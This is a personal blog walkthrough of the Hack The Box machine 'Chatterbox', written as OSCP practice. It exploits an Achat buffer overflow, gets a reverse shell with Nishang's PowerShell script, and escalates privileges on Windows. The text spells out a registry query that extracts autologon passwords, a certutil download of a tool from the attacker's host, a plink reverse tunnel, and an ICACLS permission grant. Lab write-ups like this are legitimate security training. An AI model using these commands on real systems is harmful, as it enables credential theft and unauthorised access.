---

title: "Chatterbox HTB"
date: 2024-01-23 20:17:41 +0800
categories: [Chatterbox-HTB, Medium]
tags: [Chatterbox, Medium-Windows, HTB Walkthrough]

---

Fast forward to this series, I am working on all of the boxes that lead to OSCP. Mainly focusing on Thinking Methodology “Why we are doing what we’re doing.” End of the road, I am gonna create a mind map. Please shower me with constructive feedback. I try to improve as I progress.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Analyzing Nmap result:
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
There’s a 9255 and 9256 ports one is TCP & the other one is UDP. Both are functioning as an Achat Chat system httpd.
The operating system is Windows 7601 Service Pack 1.
The port we have discovered is 9256(UDP, Achat). Upon searching for vulnerabilities through searchsploit.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
we can spot this vulnerability, Remote Buffer Overflow.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Upon inspecting the payload, we can see that all the bad characters are already placed for us. Upon execution, it is running calc.exe in order for the payload to be worked.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
There are 2 ways of getting an initial foothold onto the system with this exploit. It can be more with Metasploit exploit. This procedure is based on no metasploit methods. This is better because this machine resembles OSCP boxes, where the use of Metasploit is limited to one machine.
Seeing the payload size is limited to around 512 bytes, which is relatively very low.
we can normally use staged payloads here. So, it will be taking fewer bytes now. And execute back from the victim machine later.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
So, for this exploit to work, we have to create a payload. The bad characters are already written for us inside the code. Just needed to add address and payload options to gain a shell. In this case a reverse shell. So you can generate the following payload.
Example payload:
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
For this method to work, we need to run a Python server. While hosting the InvokeTcp Reverse shell PowerShell file from Nishang’s Powershell scripts.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Don’t forget to add Invoke-PowershellTcp -Reverse -IPAddress <IP> -Port 443 at the end of the file inside the Powershell script which you have been uploading.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
And and, This can get you the shell you are looking for…
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Method #2:
Non-Staged vs Staged Payloads:
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
And Tada!! User flag is found.
Still, we can’t access the root.txt inside the administrator directory.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
reg query “HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon” 2>nul | findstr “DefaultUserName DefaultDomainName DefaultPassword”
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
we got the Alfred user’s password. we got some results out of system enumeration.
Let us continue to surf more with network enumeration.
netstat -ano → for information about ports that were running on the system.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Seem’s like these two ports 135 and 445 are invisible from our scan.
So, these ports are open on the local network and invisible to the outside network with an Nmap scan. And yes we can absolutely use port forwarding similar to the SSH port forwarding. Since we have no active SSH connection right now.
Using a Putty tunnel can be a better option since it supports port forwarding. If we are able to establish a putty connection from the Alfred machine. Then we might have a chance of escalating the privileges further.
certutil -urlcache -f http://10.10.14.89/plink.exe plink.exe
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
I was using this 32-bit executable from the Putty website.
after getting our putty on the victim machine.
Make sure the root access is permitted from our Kali machine with making sure changing this setting and configuring the SSH at line 32.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Change this from 22 to a random working port if this method doesn’t work then try again. Since my HTB is blocking away 22 ports for some reason.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
plink.exe -l kali -pw toor -P 4545 -R 445:127.0.0.1:445 10.10.14.89
Can get us access to our root shell. So, basically, it sign in our box as root to the inside chatterbox machine. This didn’t work in my case.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Going forward I have tried the Metasploit method but it didn’t as well.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Method #2:
Since we are given access to the Administrator directory but seems like we don’t have access to the root.txt file inside it.
I was running around trying gigantic things this is so simple approach.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
ICACLS root.txt /grant “Users”: F
After this, we can easily access it.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
And we got ROOOOOT Flag!!
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
But it still is a good learning curve,
You’ll get to use System Enumeration commands to find hidden passwords. And how to Execute PowerShell commands on the victim machine remotely with Windows/exec CMD. File transfers. Upgrading the Netcat shell to Meterpreter shell. Finally Elevating File permissions. I did learn a lot of cool tricks out of this machine. Hopefully, you had fun too.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
why we are doing, what we are doing?
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Thank you for following up.